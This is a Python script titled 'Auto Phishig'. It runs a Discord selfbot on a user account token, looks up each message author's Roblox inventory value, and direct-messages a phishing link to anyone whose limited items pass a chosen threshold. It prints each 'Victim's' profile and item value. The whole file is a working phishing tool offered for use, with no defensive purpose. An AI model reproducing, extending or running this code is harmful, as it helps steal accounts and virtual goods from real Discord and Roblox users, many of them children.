#Auto Phishig
import requests, re, time
from discord.ext import commands
from colorama import Fore

#Asking for Input
print(f"{Fore.LIGHTCYAN_EX}Made By Dreamer#5114\n")

print(f"Make Sure To Join Servers That Makes User's\nDisplay Names As Their Roblox User And Use On A Alt.\n")
targetAmount = int(input(f"{Fore.YELLOW}How Many Rap to Target:{Fore.LIGHTCYAN_EX} "))
phishingLink = input(f"{Fore.YELLOW}Enter Phishing Link:{Fore.LIGHTCYAN_EX} ")
message = input(f"{Fore.YELLOW}Enter Message:{Fore.LIGHTCYAN_EX} ")

#Discord Bot Setup
client = commands.Bot(command_prefix="blahblahnahnahnahIGNORE")
client.remove_command('help')
#On Ready
@client.event
async def on_ready():
	print(f"\n{Fore.GREEN}_____________Online!_____________{Fore.RESET}\n")

@client.event
async def on_message(ctx):
	#Setting Variables
	null = 0
	totalRap = 0
	limitedsAmount = 0
	rapIndex = []

	#Cool-Down
	time.sleep(7)
	#Message Author Info
	username = ctx.author.display_name
	userText = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}")
	userIDText = userText.text
	userIDBegin = userIDText.find('"Id":') + 4
	userIDEnd = userIDBegin
	discordTag = f"{ctx.author.name}#{ctx.author.discriminator}"

	#Print Checking Message Author
	print(f"{Fore.LIGHTYELLOW_EX}Checking {Fore.CYAN}{username} ({discordTag}){Fore.RESET}...")
	#Getting Message Author's Roblox ID
	while True:
		userIDEnd += 1
		if userIDText[userIDEnd] == ",":
			userID = userIDText[userIDBegin+1:userIDEnd]
			break

	#Getting Message Author's Inventory
	invInfo = requests.get(f"https://inventory.roblox.com/v1/users/{userID}/assets/collectibles?sortOrder=Asc&limit=100")
	invInfo = invInfo.text

	#Adding Limiteds Amount
	for match in re.finditer("recentAveragePrice", invInfo):
		rapIndex.append(match.end())
		limitedsAmount += 1

	#Adding Total Rap
	for i in rapIndex:
		begin = i + 2
		start = begin
		while True:
			if invInfo[start] == ",":
				if invInfo[begin:start] != "null":
					totalRap += int(invInfo[begin:start])
				else:
					break		
				break
			start += 1

	#Sending Message If Message Author Has Enough RAP
	if totalRap >= targetAmount:
		try:
			
			#Sending Message
			await ctx.author.send(f"{phishingLink}\n{message}")
			#Printing Output
			print(f"\n{Fore.GREEN}Sent Message To {Fore.CYAN}{discordTag} ({ctx.author.id}) ({username})")
			print(f"{Fore.GREEN}User Profile: {Fore.CYAN}https://roblox.com/users/{userID}/profile")
			print(f"{Fore.GREEN}User Rolimons: {Fore.CYAN}https://rolimons.com/player/{userID}")
			print(f"{Fore.GREEN}Victim's Limiteds Amount: {Fore.CYAN}{limitedsAmount}")
			print(f"{Fore.GREEN}Victim's Rap: {Fore.CYAN}{totalRap}")

		#Except If Can't Send Message
		except Exception as error:
			print(f"\n{Fore.RED}Error occurred when attempting to send message to {discordTag}\nError: {error}\nContinuing...\n")

#Execute on Discord
client.run("token here", bot=False)
#g
